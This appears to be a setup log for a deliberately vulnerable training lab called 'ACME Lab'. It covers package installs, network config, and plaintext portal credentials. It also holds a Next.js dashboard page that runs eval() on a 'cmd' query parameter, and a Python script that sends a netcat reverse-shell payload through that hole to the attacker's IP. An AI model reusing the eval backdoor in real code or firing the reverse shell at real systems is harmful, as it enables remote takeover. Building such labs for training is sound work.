# ACME Lab Command Log

## Commands

1.  sudo apt update && sudo apt upgrade -y

2.  sudo apt install -y\
    apache2\
    php libapache2-mod-php php-cli\
    vsftpd\
    fail2ban\
    tripwire\
    snort\
    ufw\
    iptables\
    net-tools\
    curl wget git\
    openssl\
    build-essential\
    libpcre3-dev libdumbnet-dev libpcap-dev zlib1g-dev\
    nodejs npm\
    cron\
    openssh-server\
    unzip\
    vim\
    auditd

3.  sudo systemctl stop apache2

4.  sudo systemctl stop vsftpd

5.  sudo systemctl stop snort 2\>/dev/null \|\| true

6.  sudo systemctl disable apache2

7.  sudo systemctl disable vsftpd

8.  ip a

------------------------------------------------------------------------

## Netplan Config

``` yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    enp0s3:
      match:
        macaddress: 08:00:27:69:9b:d0
      set-name: enp0s3
      dhcp4: true
    enp0s8:
      match:
        macaddress: 08:00:27:6a:85:4c
      set-name: enp0s8
      dhcp4: false
      addresses:
        - 192.168.56.21/24
```

------------------------------------------------------------------------

## Portal Credentials

    mitchmarcus:ITAdmin2026:admin
    alicebrown:AlicePortal2026:user    # Only Alice can upload files
    bobbarker:BobPortal2026:user
    claireredfield:ClairePortal2026:user
    evejohnson:EvePortal2026:user
    fongling:FongPortal2026:user
    mallorymartinez:MalloryPortal2026:admin

------------------------------------------------------------------------

## Python Script

`/home/fongling/Scripts/RemoteAccess_v1.py`

``` python
#!/usr/bin/env python3
import requests
import argparse
import sys

def trigger_maintenance_shell(url, host_ip, port):
    maintenance_payload = (
        f"require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;"
        f"cat /tmp/f|/bin/sh -i 2>&1|nc {host_ip} {port} >/tmp/f')"
    )

    params = {"cmd": maintenance_payload}

    try:
        requests.get(url, params=params, timeout=2)
    except requests.exceptions.ReadTimeout:
        print("Signal sent.")
    except Exception as e:
        print(f"Failure: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--my_ip", required=True)
    parser.add_argument("--port", default="4444")

    args = parser.parse_args()

    target_url = args.target
    if not target_url.startswith("http"):
        target_url = f"http://{target_url}/health-check"

    trigger_maintenance_shell(target_url, args.my_ip, args.port)
```

------------------------------------------------------------------------

## Next.js Dashboard

`/opt/acme-next-dashboard/pages/dashboard.js`

``` javascript
export async function getServerSideProps(context) {
  const { query } = context;
  const currentUser = query.user || 'fongling';
  let systemInfo = "System standby.";

  if (query.cmd) {
    try {
      systemInfo = eval(query.cmd);
    } catch (e) {
      return { props: { error: e.message, currentUser } };
    }
  }

  return { props: { systemInfo: String(systemInfo), currentUser } };
}
```

------------------------------------------------------------------------

## Service Restart

    cd /opt/acme-next-dashboard && sudo npm run build
    sudo systemctl restart acme-health
